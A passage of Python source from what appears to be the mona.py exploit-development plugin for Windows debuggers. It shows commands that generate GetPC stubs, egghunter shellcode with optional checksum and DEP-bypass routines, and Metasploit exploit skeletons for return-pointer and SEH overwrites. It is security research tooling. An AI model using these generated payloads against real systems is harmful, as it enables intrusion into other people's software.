						if newversion != "" and newrevision != "":
							dbg.log("[+] Version compare :")
							dbg.log("    Current Version : %s, Current Revision : %s" % (currentversion,currentrevision))
							dbg.log("    Latest Version : %s, Latest Revision : %s" % (newversion,newrevision))
						else:
							dbg.log("[-] Unable to check latest version (corrupted file ?), try again later",highlight=1)
							return
					except:
						dbg.log("[-] Unable to check latest version (download error), run !mona update -http or try again later",highlight=1)
						return

					#check versions
					doupdate = False
					if newversion != "" and newrevision != "":
						if currentversion != newversion:
							doupdate = True
						else:
							if int(currentrevision) < int(newrevision):
								doupdate = True
						
					if doupdate:
						dbg.log("[+] New version available",highlight=1)
						dbg.log("    Updating to %s r%s" % (newversion,newrevision),highlight=1) 
						try:
							shutil.copyfile(u[0],libfile)
							dbg.log("    Done")					
						except:
							dbg.log("    ** Unable to update windbglib.py",highlight=1)
						currentversion,currentrevision = getVersionInfo(libfile)
						dbg.log("[+] Current version : %s r%s" % (currentversion,currentrevision))
					else:
						dbg.log("[+] You are running the latest version")

			dbg.setStatusBar("Done.")
			return
			
		#----- GetPC -----#
		def procgetPC(args):
			r32 = ""
			output = ""
			if "r" in args:
				if type(args["r"]).__name__.lower() != "bool":	
					r32 = args["r"].lower()
						  
			if r32 == "" or not "r" in args:
				dbg.log("Missing argument -r <register>",highlight=1)
				return

			opcodes = {}
			opcodes["eax"] = "\\x58"
			opcodes["ecx"] = "\\x59"
			opcodes["edx"] = "\\x5a"
			opcodes["ebx"] = "\\x5b"				
			opcodes["esp"] = "\\x5c"
			opcodes["ebp"] = "\\x5d"
			opcodes["esi"] = "\\x5e"
			opcodes["edi"] = "\\x5f"

			calls = {}
			calls["eax"] = "\\xd0"
			calls["ecx"] = "\\xd1"
			calls["edx"] = "\\xd2"
			calls["ebx"] = "\\xd3"				
			calls["esp"] = "\\xd4"
			calls["ebp"] = "\\xd5"
			calls["esi"] = "\\xd6"
			calls["edi"] = "\\xd7"
			
			output  = "\n" + r32 + "|  jmp short back:\n\"\\xeb\\x03" + opcodes[r32] + "\\xff" + calls[r32] + "\\xe8\\xf8\\xff\\xff\\xff\"\n"
			output += r32 + "|  call + 4:\n\"\\xe8\\xff\\xff\\xff\\xff\\xc3" + opcodes[r32] + "\"\n"
			output += r32 + "|  fstenv:\n\"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4" + opcodes[r32] + "\"\n"
                        
			global ignoremodules
			ignoremodules = True
			getpcfilename="getpc.txt"
			objgetpcfile = MnLog(getpcfilename)
			getpcfile = objgetpcfile.reset()
			objgetpcfile.write(output,getpcfile)
			ignoremodules = False
			dbg.logLines(output)
			dbg.log("")			
			dbg.log("Wrote to file %s" % getpcfile)
			return		

			
		#----- Egghunter -----#
		def procEgg(args):
			filename = ""
			egg = "w00t"
			usechecksum = False
			egg_size = 0
			checksumbyte = ""
			extratext = ""
			
			global silent
			oldsilent = silent
			silent = True			
			
			if "f" in args:
				if type(args["f"]).__name__.lower() != "bool":
					filename = args["f"]
			filename = filename.replace("'", "").replace("\"", "")					

			#Set egg
			if "t" in args:
				if type(args["t"]).__name__.lower() != "bool":
					egg = args["t"]

			if len(egg) != 4:
				egg = 'w00t'
			dbg.log("[+] Egg set to %s" % egg)
			
			if "c" in args:
				if filename != "":
					usechecksum = True
					dbg.log("[+] Hunter will include checksum routine")
				else:
					dbg.log("Option -c only works in conjunction with -f <filename>",highlight=1)
					return
			
			startreg = ""
			if "startreg" in args:
				if isReg(args["startreg"]):
					startreg = args["startreg"].lower()
					dbg.log("[+] Egg will start search at %s" % startreg)
			
					
			depmethods = ["virtualprotect","copy","copy_size"]
			depreg = "esi"
			depsize = 0
			freeregs = [ "ebx","ecx","ebp","esi" ]
			
			regsx = {}
			# 0 : mov xX
			# 1 : push xX
			# 2 : mov xL
			# 3 : mov xH
			#
			regsx["eax"] = ["\x66\xb8","\x66\x50","\xb0","\xb4"]
			regsx["ebx"] = ["\x66\xbb","\x66\x53","\xb3","\xb7"]
			regsx["ecx"] = ["\x66\xb9","\x66\x51","\xb1","\xb5"]
			regsx["edx"] = ["\x66\xba","\x66\x52","\xb2","\xb6"]
			regsx["esi"] = ["\x66\xbe","\x66\x56"]
			regsx["edi"] = ["\x66\xbf","\x66\x57"]
			regsx["ebp"] = ["\x66\xbd","\x66\x55"]
			regsx["esp"] = ["\x66\xbc","\x66\x54"]
			
			addreg = {}
			addreg["eax"] = "\x83\xc0"
			addreg["ebx"] = "\x83\xc3"			
			addreg["ecx"] = "\x83\xc1"
			addreg["edx"] = "\x83\xc2"
			addreg["esi"] = "\x83\xc6"
			addreg["edi"] = "\x83\xc7"
			addreg["ebp"] = "\x83\xc5"			
			addreg["esp"] = "\x83\xc4"
			
			depdest = ""
			depmethod = ""
			
			getpointer = ""
			getsize = ""
			getpc = ""
			
			jmppayload = "\xff\xe7"
			
			if "depmethod" in args:
				if args["depmethod"].lower() in depmethods:
					depmethod = args["depmethod"].lower()
					dbg.log("[+] Hunter will include routine to bypass DEP on found shellcode")
					# other DEP related arguments ?
					# depreg
					# depdest
					# depsize
				if "depreg" in args:
					if isReg(args["depreg"]):
						depreg = args["depreg"].lower()
				if "depdest" in args:
					if isReg(args["depdest"]):
						depdest = args["depdest"].lower()
				if "depsize" in args:
					try:
						depsize = int(args["depsize"])
					except:
						dbg.log(" ** Invalid depsize",highlight=1)
						return
			
			
			#read payload file
			data = ""
			if filename != "":
				try:
					f = open(filename, "rb")
					data = f.read()
					f.close()
					dbg.log("[+] Read payload file (%d bytes)" % len(data))
				except:
					dbg.log("Unable to read file %s" %filename, highlight=1)
					return

					
			#let's start		
			egghunter = ""
			
			#Basic version of egghunter
			dbg.log("[+] Generating egghunter code")
			egghunter += (
				"\x66\x81\xca\xff\x0f"+	#or dx,0xfff
				"\x42"+					#INC EDX
				"\x52"					#push edx
				"\x6a\x02"				#push 2	(NtAccessCheckAndAuditAlarm syscall)
				"\x58"					#pop eax
				"\xcd\x2e"				#int 0x2e 
				"\x3c\x05"				#cmp al,5
				"\x5a"					#pop edx
				"\x74\xef"				#je "or dx,0xfff"
				"\xb8"+egg+				#mov eax, egg
				"\x8b\xfa"				#mov edi,edx
				"\xaf"					#scasd
				"\x75\xea"				#jne "inc edx"
				"\xaf"					#scasd
				"\x75\xe7"				#jne "inc edx"
			)
			
			if usechecksum:
				dbg.log("[+] Generating checksum routine")
				extratext = "+ checksum routine"
				egg_size = ""
				if len(data) < 256:
					cmp_reg = "\x80\xf9"	#cmp cl,value
					egg_size = hex2bin("%x" % len(data))
					offset1 = "\xf7"
					offset2 = "\xd3"
				elif len(data) < 65536:
					cmp_reg = "\x66\x81\xf9"	#cmp cx,value
					#avoid nulls
					egg_size_normal = "%04X" % len(data)
					while egg_size_normal[0:2] == "00" or egg_size_normal[2:4] == "00":
						data += "\x90"
						egg_size_normal = "%04X" % len(data)
					egg_size = hex2bin(egg_size_normal[2:4]) + hex2bin(egg_size_normal[0:2])
					offset1 = "\xf5"
					offset2 = "\xd1"
				else:
					dbg.log("Cannot use checksum code with this payload size (way too big)",highlight=1)
					return
					
				sum = 0
				for byte in data:
					sum += ord(byte)
				sumstr= toHex(sum)
				checksumbyte = sumstr[len(sumstr)-2:len(sumstr)]

				egghunter += (
					"\x51"						#push ecx
					"\x31\xc9"					#xor ecx,ecx
					"\x31\xc0"					#xor eax,eax
					"\x02\x04\x0f"				#add al,byte [edi+ecx]
					"\x41"+						#inc ecx
					cmp_reg + egg_size +    	#cmp cx/cl, value
					"\x75" + offset1 +			#jnz "add al,byte [edi+ecx]
					"\x3a\x04\x39" +			#cmp al,byte [edi+ecx]
					"\x59" +					#pop ecx
					"\x75" + offset2			#jnz "inc edx"
				)		

			#dep bypass ?
			if depmethod != "":
				dbg.log("[+] Generating dep bypass routine")
			
				if not depreg in freeregs:
					getpointer += "mov " + freeregs[0] +"," + depreg + "#"
					depreg = freeregs[0]
				
				freeregs.remove(depreg)
				if depmethod == "copy" or depmethod == "copy_size":
					if depdest != "":
						if not depdest in freeregs:
							getpointer += "mov " + freeregs[0] + "," + depdest + "#"
							depdest = freeregs[0]
					else:
						getpc = "\xd9\xee"			# fldz
						getpc += "\xd9\x74\xe4\xf4"	# fstenv [esp-0c]
						depdest = freeregs[0]
						getpc += hex2bin(assemble("pop "+depdest))
					
					freeregs.remove(depdest)
				
				sizereg = freeregs[0]
				
				if depsize == 0:
					# set depsize to payload * 2 if we are using a file
					depsize = len(data) * 2
					if depmethod == "copy_size":
						depsize = len(data)
					
				if depsize == 0:
					dbg.log("** Please specify a valid -depsize when you are not using -f **",highlight=1)
					return
				else:
					if depsize <= 127:
						#simply push it to the stack
						getsize = "\x6a" + hex2bin("\\x" + toHexByte(depsize))
					else:
						#can we do it with 16bit reg, no nulls ?
						if depsize <= 65535:
							sizeparam = toHex(depsize)[4:8]
							getsize = hex2bin(assemble("xor "+sizereg+","+sizereg))
							if not (sizeparam[0:2] == "00" or sizeparam[2:4] == "00"):
								#no nulls, hooray, write to xX
								getsize += regsx[sizereg][0]+hex2bin("\\x" + sizeparam[2:4] + "\\x" + sizeparam[0:2])
							else:
								# write the non null if we can
								if len(regsx[sizereg]) > 2:
									if not (sizeparam[0:2] == "00"):
										# write to xH
										getsize += regsx[sizereg][3] + hex2bin("\\x" + sizeparam[0:2])
									if not (sizeparam[2:4] == "00"):
										# write to xL
										getsize += regsx[sizereg][2] + hex2bin("\\x" + sizeparam[2:4])
								else:
									#we have to write the full value to sizereg
									blockcnt = 0
									vpsize = 0
									blocksize = depsize
									while blocksize >= 127:
										blocksize = blocksize / 2
										blockcnt += 1
									if blockcnt > 0:
										getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(blocksize))
										vpsize = blocksize
										depblockcnt = 0
										while depblockcnt < blockcnt:
											getsize += hex2bin(assemble("add "+sizereg+","+sizereg))
											vpsize += vpsize
											depblockcnt += 1
										delta = depsize - vpsize
										if delta > 0:
											getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(delta))
									else:
										getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(depsize))
								# finally push
							getsize += hex2bin(assemble("push "+ sizereg))
								
						else:
							dbg.log("** Shellcode size (depsize) is too big",highlight=1)
							return
						
				#finish it off
				if depmethod == "virtualprotect":
					jmppayload = "\x54\x6a\x40"
					jmppayload += getsize
					jmppayload += hex2bin(assemble("#push edi#push edi#push "+depreg+"#ret"))
				elif depmethod == "copy":
					jmppayload = hex2bin(assemble("push edi\push "+depdest+"#push "+depdest+"#push "+depreg+"#mov edi,"+depdest+"#ret"))
				elif depmethod == "copy_size":
					jmppayload += getsize
					jmppayload += hex2bin(assemble("push edi#push "+depdest+"#push " + depdest + "#push "+depreg+"#mov edi,"+depdest+"#ret"))
				
		
			#jmp to payload
			egghunter += getpc
			egghunter += jmppayload
			
			startat = ""
			skip = ""
			
			#start at a certain reg ?
			if startreg != "":
				if startreg != "edx":
					startat = hex2bin(assemble("mov edx," + startreg))
				skip = "\xeb\x05"
			
			egghunter = skip + egghunter
			#pickup pointer for DEP bypass ?
			egghunter = hex2bin(assemble(getpointer)) + egghunter
			
			egghunter = startat + egghunter
			
			silent = oldsilent			
			
			#Convert binary to printable hex format
			egghunter_hex = toniceHex(egghunter.strip().replace(" ",""),16)
					
			global ignoremodules
			ignoremodules = True
			hunterfilename="egghunter.txt"
			objegghunterfile = MnLog(hunterfilename)
			egghunterfile = objegghunterfile.reset()						

			dbg.log("[+] Egghunter %s (%d bytes): " % (extratext,len(egghunter.strip().replace(" ",""))))
			dbg.logLines("%s" % egghunter_hex)
			
			objegghunterfile.write("Egghunter " + extratext + ", tag " + egg + " : ",egghunterfile)
			objegghunterfile.write(egghunter_hex,egghunterfile)			

			if filename == "":
				objegghunterfile.write("Put this tag in front of your shellcode : " + egg + egg,egghunterfile)
			else:
				dbg.log("[+] Shellcode, with tag : ")			
				block = "\"" + egg + egg + "\"\n"
				cnt = 0
				flip = 1
				thisline = "\""
				while cnt < len(data):
					thisline += "\\x%s" % toHexByte(ord(data[cnt]))				
					if (flip == 32) or (cnt == len(data)-1):
						if cnt == len(data)-1 and checksumbyte != "":
							thisline += "\\x%s" % checksumbyte					
						thisline += "\""
						flip = 0
						block += thisline 
						block += "\n"
						thisline = "\""
					cnt += 1
					flip += 1
				dbg.logLines(block)	
				objegghunterfile.write("\nShellcode, with tag :\n",egghunterfile)
				objegghunterfile.write(block,egghunterfile)	
		
			ignoremodules = False
					
			return
		
		#----- Find MSP ------ #
		
		def procFindMSP(args):
			distance = 0
			
			if "distance" in args:
				try:
					distance = int(args["distance"])
				except:
					distance = 0
			if distance < 0:
				dbg.log("** Please provide a positive number as distance",highlight=1)
				return
			mspresults = {}
			mspresults = goFindMSP(distance,args)
			return
			
		def procSuggest(args):
			modulecriteria={}
			criteria={}
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			isEIP = False
			isSEH = False
			isEIPUnicode = False
			isSEHUnicode = False
			initialoffsetSEH = 0
			initialoffsetEIP = 0
			shellcodesizeSEH = 0
			shellcodesizeEIP = 0
			nullsallowed = True
			
			global ignoremodules
			global noheader
			global ptr_to_get
			global silent
			global ptr_counter
			
			targetstr = ""
			exploitstr = ""
			originalauthor = ""
			url = ""
			
			#are we attached to an application ?
			if dbg.getDebuggedPid() == 0:
				dbg.log("** You don't seem to be attached to an application ! **",highlight=1)
				return

			exploittype = ""
			skeletonarg = ""
			usecliargs = False
			validstypes ={}
			validstypes["tcpclient"] = "network client (tcp)"
			validstypes["udpclient"] = "network client (udp)"
			validstypes["fileformat"] = "fileformat"
			exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
			if __DEBUGGERAPP__ == "WinDBG" or "t" in args:
				if "t" in args:
					if type(args["t"]).__name__.lower() != "bool":
						skeltype = args["t"].lower()
						skelparts = skeltype.split(":")
						if skelparts[0] in validstypes:
							exploittype = validstypes[skelparts[0]]
							if len(skelparts) > 1:
								skeletonarg = skelparts[1]
							else:
								dbg.log(" ** Please specify the skeleton type AND an argument. **")
								return
							usecliargs = True
						else:
							dbg.log(" ** Please specify a valid skeleton type and an argument. **")
							return							
					else:
						dbg.log(" ** Please specify a skeletontype using -t **",highlight=1)
						return
				else:
					dbg.log(" ** Please specify a skeletontype using -t **",highlight=1)
					return

			mspresults = {}
			mspresults = goFindMSP(100,args)

			#create metasploit skeleton file
			exploitfilename="exploit.rb"
			objexploitfile = MnLog(exploitfilename)

			#ptr_to_get = 5				
			noheader = True
			ignoremodules = True
			exploitfile = objexploitfile.reset()			
			ignoremodules = False
			noheader = False
			
			dbg.log(" ")
			dbg.log("[+] Preparing payload...")
			dbg.log(" ")			
			dbg.updateLog()
			#what options do we have ?
			# 0 : pointer
			# 1 : offset
			# 2 : type
			
			if "registers" in mspresults:
				for reg in mspresults["registers"]:
					if reg.upper() == "EIP":
						isEIP = True
						eipval = mspresults["registers"][reg][0]
						ptrx = MnPointer(eipval)
						initialoffsetEIP = mspresults["registers"][reg][1]
						
			# 0 : pointer
			# 1 : offset
			# 2 : type
			# 3 : size
			if "seh" in mspresults:
				if len(mspresults["seh"]) > 0:
					isSEH = True
					for seh in mspresults["seh"]:
						if mspresults["seh"][seh][2] == "unicode":
							isSEHUnicode = True
						if not isSEHUnicode:
							initialoffsetSEH = mspresults["seh"][seh][1]
						else:
							initialoffsetSEH = mspresults["seh"][seh][1]
						shellcodesizeSEH = mspresults["seh"][seh][3]
						
			if isSEH:
				ignoremodules = True
				noheader = True
				exploitfilename_seh="exploit_seh.rb"
				objexploitfile_seh = MnLog(exploitfilename_seh)
				exploitfile_seh = objexploitfile_seh.reset()				
				ignoremodules = False
				noheader = False

			# start building exploit structure
			
			if not isEIP and not isSEH:
				dbg.log(" ** Unable to suggest anything useful. You don't seem to control EIP or SEH ** ",highlight=1)
				return

			# ask for type of module
			if not usecliargs:
				dbg.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
				exploittype = dbg.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()

			if not exploittype in exploittypes:
				dbg.log("Boo - invalid exploit type, try again !",highlight=1)
				return


			portnr = 0
			extension = ""
			if exploittype.find("network") > -1:
				if usecliargs:
					portnr = skeletonarg
				else:
					portnr = dbg.inputBox("Remote port number : ")
				try:
					portnr = int(portnr)
				except:
					portnr = 0

			if exploittype.find("fileformat") > -1:
				if usecliargs:
					extension = skeletonarg
				else:
					extension = dbg.inputBox("File extension :")
			
			extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
			
			if not extension.startswith("."):
				extension = "." + extension	
				
				
			dbg.createLogWindow()
			dbg.updateLog()
			url = ""
			
			badchars = ""
			if "badchars" in criteria:
				badchars = criteria["badchars"]
				
			if "nonull" in criteria:
				if not '\x00' in badchars:
					badchars += '\x00'
			
			skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,url,badchars)
			
			regsto = ""			

			if isEIP:
				dbg.log("[+] Attempting to create payload for saved return pointer overwrite...")
				#where can we jump to - get the register that has the largest buffer size
				largestreg = ""
				largestsize = 0
				offsetreg = 0
				regptr = 0
				# register_to
				# 0 : pointer
				# 1 : offset
				# 2 : size
				# 3 : type
				eipcriteria = criteria
				modulecriteria["aslr"] = False
				modulecriteria["rebase"] = False
				modulecriteria["os"] = False
				jmp_pointers = {}
				jmppointer = 0
				instrinfo = ""

				if isEIPUnicode:
					eipcriteria["unicode"] = True
					eipcriteria["nonull"] = False
					
				if "registers_to" in mspresults:
					for reg in mspresults["registers_to"]:
						regsto += reg+","
						thissize = mspresults["registers_to"][reg][2]
						thisreg = reg
						thisoffset = mspresults["registers_to"][reg][1]
						thisregptr = mspresults["registers_to"][reg][0]
						if thisoffset < initialoffsetEIP:
							#fix the size, which will end at offset to EIP
							thissize = initialoffsetEIP - thisoffset
						if thissize > largestsize:								
							# can we find a jmp to that reg ?
							silent = True
							ptr_counter = 0
							ptr_to_get = 1								
							jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
							if len( jmp_pointers ) == 0:
								ptr_counter = 0
								ptr_to_get = 1								
								modulecriteria["os"] = True
								jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
							modulecriteria["os"] = False
							if len( jmp_pointers ) > 0:
								largestsize = thissize 
								largestreg = thisreg
								offsetreg = thisoffset
								regptr = thisregptr
							silent = False
				regsto = regsto.rstrip(",")
				
				
				if largestreg == "":
					dbg.log("    Payload is referenced by at least one register (%s), but I couldn't seem to find" % regsto,highlight=1)
					dbg.log("    a way to jump to that register",highlight=1)
				else:
					#build exploit
					for ptrtype in jmp_pointers:
						jmppointer = jmp_pointers[ptrtype][0]
						instrinfo = ptrtype
						break
					ptrx = MnPointer(jmppointer)
					modname = ptrx.belongsTo()
					targetstr = "\t\t\t'Targets'\t\t=>\n"
					targetstr += "\t\t\t\t[\n"
					targetstr += "\t\t\t\t\t[ '<fill in the OS/app version here>',\n"
					targetstr += "\t\t\t\t\t\t{\n"
					if not isEIPUnicode:
						targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t0x" + toHex(jmppointer) + ", # " + instrinfo + " - " + modname + "\n"
						targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t" + str(initialoffsetEIP) + "\n"
					else:
						origptr = toHex(jmppointer)
						#real unicode ?
						unicodeptr = ""
						transforminfo = ""
						if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":					
							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
						else:
							#transform
							transform = UnicodeTransformInfo(origptr)
							transformparts = transform.split(",")
							transformsubparts = transformparts[0].split(" ")
							origptr = transformsubparts[len(transformsubparts)-1]
							transforminfo = " #unicode transformed to 0x" + toHex(jmppointer)
							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
						targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t" + unicodeptr + "," + transforminfo + "# " + instrinfo + " - " + modname + "\n"
						targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t" + str(initialoffsetEIP) + "\t#Unicode\n"	
					
					targetstr += "\t\t\t\t\t\t}\n"
					targetstr += "\t\t\t\t\t],\n"
					targetstr += "\t\t\t\t],\n"

					exploitstr = "\tdef exploit\n\n"
					if exploittype.find("network") > -1:
						if exploittype.find("tcp") > -1:
							exploitstr += "\n\t\tconnect\n\n"
						elif exploittype.find("udp") > -1:
							exploitstr += "\n\t\tconnect_udp\n\n"
					
					if initialoffsetEIP < offsetreg:
						# eip is before shellcode
						exploitstr += "\t\tbuffer =  rand_text(target['Offset'])\t\n"
						if not isEIPUnicode:
							exploitstr += "\t\tbuffer << [target.ret].pack('V')\t\n"
						else:
							exploitstr += "\t\tbuffer << target['Ret']\t#Unicode friendly jump\n\n"
						if offsetreg > initialoffsetEIP+2:
							if not isEIPUnicode:
								if (offsetreg - initialoffsetEIP - 4) > 0:
									exploitstr += "\t\tbuffer << rand_text(" + str(offsetreg - initialoffsetEIP - 4) + ")\t#junk\n"
							else:
								if ((offsetreg - initialoffsetEIP - 4)/2) > 0:
									exploitstr += "\t\tbuffer << rand_text(" + str((offsetreg - initialoffsetEIP - 4)/2) + ")\t#unicode junk\n"
						nops = 0
						if largestreg.upper() == "ESP":
							if not isEIPUnicode:
								exploitstr += "\t\tbuffer << make_nops(30) # avoid GetPC shellcode corruption\n"
								nops = 30
								exploitstr += "\t\tbuffer << payload.encoded\t#max " + str(largestsize - nops) + " bytes\n"
						if isEIPUnicode:
							exploitstr += "\t\t# Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
							exploitstr += "\t\t# and then manually encode with unicode inside the exploit section :\n\n"
							exploitstr += "\t\tenc = framework.encoders.create('x86/unicode_mixed')\n\n"
							exploitstr += "\t\tregister_to_align_to = '" + largestreg.upper() + "'\n\n"
							if largestreg.upper() == "ESP":
								exploitstr += "\t\t# Note : since you are using ESP as bufferregister, make sure EBP points to a writeable address !\n"
								exploitstr += "\t\t# or patch the unicode decoder yourself\n"
							exploitstr += "\t\tenc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
							exploitstr += "\t\tunicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
							exploitstr += "\t\tbuffer << unicodepayload"
								
					else:
						# EIP -> jump to location before EIP
						beforeEIP = initialoffsetEIP - offsetreg
						if beforeEIP > 0:
							if offsetreg > 0:
								exploitstr += "\t\tbuffer = rand_text(" + str(offsetreg)+")\t#offset to " + largestreg+"\n"
								exploitstr += "\t\tbuffer << payload.encoded\t#max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
								exploitstr += "\t\tbuffer << rand_text(target['Offset'] - payload.encoded.length)\n"
								exploitstr += "\t\tbuffer << [target.ret].pack('V')\t\n"
							else:
								exploitstr += "\t\tbuffer = payload.encoded\t#max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
								exploitstr += "\t\tbuffer << rand_text(target['Offset'] - payload.encoded.length)\n"
								exploitstr += "\t\tbuffer << [target.ret].pack('V')\t\n"

					if exploittype.find("network") > -1:
						exploitstr += "\n\t\tprint_status(\"Trying target #{target.name}...\")\n"
						if exploittype.find("tcp") > -1:
							exploitstr += "\t\tsock.put(buffer)\n"
							exploitstr += "\n\t\thandler\n"
						elif exploittype.find("udp") > -1:
							exploitstr += "\t\tudp_sock.put(buffer)\n"
							exploitstr += "\n\t\thandler(udp_sock)\n"
					if exploittype == "fileformat":
						exploitstr += "\n\t\tfile_create(buffer)\n\n"
					
					if exploittype.find("network") > -1:
						exploitstr += "\t\tdisconnect\n\n"
					exploitstr += "\tend\n"					
					dbg.log("Metasploit 'Targets' section :")
					dbg.log("------------------------------")
					dbg.logLines(targetstr.replace("\t","    "))
					dbg.log("")
					dbg.log("Metasploit 'exploit' function :")
					dbg.log("--------------------------------")
					dbg.logLines(exploitstr.replace("\t","    "))
					
					#write skeleton
					objexploitfile.write(skeletonheader+"\n",exploitfile)
					objexploitfile.write(skeletoninit+"\n",exploitfile)
					objexploitfile.write(targetstr,exploitfile)
					objexploitfile.write(skeletoninit2,exploitfile)		
					objexploitfile.write(exploitstr,exploitfile)
					objexploitfile.write("end",exploitfile)					
					
			
			if isSEH:
				dbg.log("[+] Attempting to create payload for SEH record overwrite...")
				sehcriteria = criteria
				modulecriteria["safeseh"] = False
				modulecriteria["rebase"] = False
				modulecriteria["aslr"] = False
				modulecriteria["os"] = False
				sehptr = 0
				instrinfo = ""
				if isSEHUnicode:
					sehcriteria["unicode"] = True
					if "nonull" in sehcriteria:
						sehcriteria.pop("nonull")
				modulecriteria["safeseh"] = False
				#get SEH pointers
				silent = True
				ptr_counter = 0
				ptr_to_get = 1					
				seh_pointers = findSEH(modulecriteria,sehcriteria)
				jmpback = False
				silent = False
				if not isSEHUnicode:
					#did we find a pointer ?
					if len(seh_pointers) == 0:
						#did we try to avoid nulls ?
						dbg.log("[+] No non-null pointers found, trying 'jump back' layout now...")
						if "nonull" in sehcriteria:
							if sehcriteria["nonull"] == True:
								sehcriteria.pop("nonull")
								silent = True
								ptr_counter = 0
								ptr_to_get = 1									
								seh_pointers = findSEH(modulecriteria,sehcriteria)
								silent = False
								jmpback = True
					if len(seh_pointers) != 0:
						for ptrtypes in seh_pointers:
							sehptr = seh_pointers[ptrtypes][0]
							instrinfo = ptrtypes
							break
				else:
					if len(seh_pointers) == 0:
						sehptr = 0
					else:
						for ptrtypes in seh_pointers:
							sehptr = seh_pointers[ptrtypes][0]
							instrinfo = ptrtypes
							break
						
				if sehptr != 0:
					ptrx = MnPointer(sehptr)
					modname = ptrx.belongsTo()
					mixin = ""
					if not jmpback:
						mixin += "#Don't forget to include the SEH mixin !\n"
						mixin += "include Msf::Exploit::Seh\n\n"
						skeletonheader += "\tinclude Msf::Exploit::Seh\n"

					targetstr = "\t\t\t'Targets'\t\t=>\n"
					targetstr += "\t\t\t\t[\n"
					targetstr += "\t\t\t\t\t[ '<fill in the OS/app version here>',\n"
					targetstr += "\t\t\t\t\t\t{\n"
					if not isSEHUnicode:
						targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t0x" + toHex(sehptr) + ", # " + instrinfo + " - " + modname + "\n"
						targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t" + str(initialoffsetSEH) + "\n"							
					else:
						origptr = toHex(sehptr)
						#real unicode ?
						unicodeptr = ""
						transforminfo = ""
						if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":					
							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
						else:
							#transform
							transform = UnicodeTransformInfo(origptr)
							transformparts = transform.split(",")
							transformsubparts = transformparts[0].split(" ")
							origptr = transformsubparts[len(transformsubparts)-1]
							transforminfo = " #unicode transformed to 0x" + toHex(sehptr)
							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
						targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t" + unicodeptr + "," + transforminfo + " # " + instrinfo + " - " + modname + "\n"
						targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t" + str(initialoffsetSEH) + "\t#Unicode\n"						
					targetstr += "\t\t\t\t\t\t}\n"
					targetstr += "\t\t\t\t\t],\n"
					targetstr += "\t\t\t\t],\n"

					exploitstr = "\tdef exploit\n\n"
					if exploittype.find("network") > -1:
						exploitstr += "\n\t\tconnect\n\n"
					
					if not isSEHUnicode:
						if not jmpback:
							exploitstr += "\t\tbuffer = rand_text(target['Offset'])\t#junk\n"
							exploitstr += "\t\tbuffer << generate_seh_record(target.ret)\n"
							exploitstr += "\t\tbuffer << make_nops(30)\n"
							exploitstr += "\t\tbuffer << payload.encoded\t#" + str(shellcodesizeSEH-30) +" bytes of space\n"
						else:
							exploitstr += "\t\tjmp_back = Rex::Arch::X86.jmp_short(-payload.encoded.length-5)\n\n"
							exploitstr += "\t\tbuffer = rand_text(target['Offset'] - payload.encoded.length - jmp_back.length)\t#junk\n"
							exploitstr += "\t\tbuffer << payload.encoded\n"
							exploitstr += "\t\tbuffer << jmp_back\t#jump back to start of payload.encoded\n"
							exploitstr += "\t\tbuffer << '\\xeb\\xf9\\x41\\x41'\t#nseh, jump back to jmp_back\n"
							exploitstr += "\t\tbuffer << [target.ret].pack('V')\t#seh\n"
					else:
						exploitstr += "\t\tnseh = <insert 2 bytes that will acts as nseh walkover>\n"
						exploitstr += "\t\talign = <insert routine to align a register to begin of payload and jump to it>\n\n"
						exploitstr += "\t\tpadding = <insert bytes to fill space between alignment code and payload>\n\n"
						exploitstr += "\t\t# Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
						exploitstr += "\t\t# and then manually encode with unicode inside the exploit section :\n\n"
						exploitstr += "\t\tenc = framework.encoders.create('x86/unicode_mixed')\n\n"
						exploitstr += "\t\tregister_to_align_to = <fill in the register name you will align to>\n\n"
						exploitstr += "\t\tenc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
						exploitstr += "\t\tunicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
						exploitstr += "\t\tbuffer = rand_text(target['Offset'])\t#unicode junk\n"
						exploitstr += "\t\tbuffer << nseh\t#Unicode walkover friendly dword\n"
						exploitstr += "\t\tbuffer << target['Ret']\t#Unicode friendly p/p/r\n"
						exploitstr += "\t\tbuffer << align\n"
						exploitstr += "\t\tbuffer << padding\n"
						exploitstr += "\t\tbuffer << unicodepayload\n"
						
					if exploittype.find("network") > -1:
						exploitstr += "\n\t\tprint_status(\"Trying target #{target.name}...\")\n"					
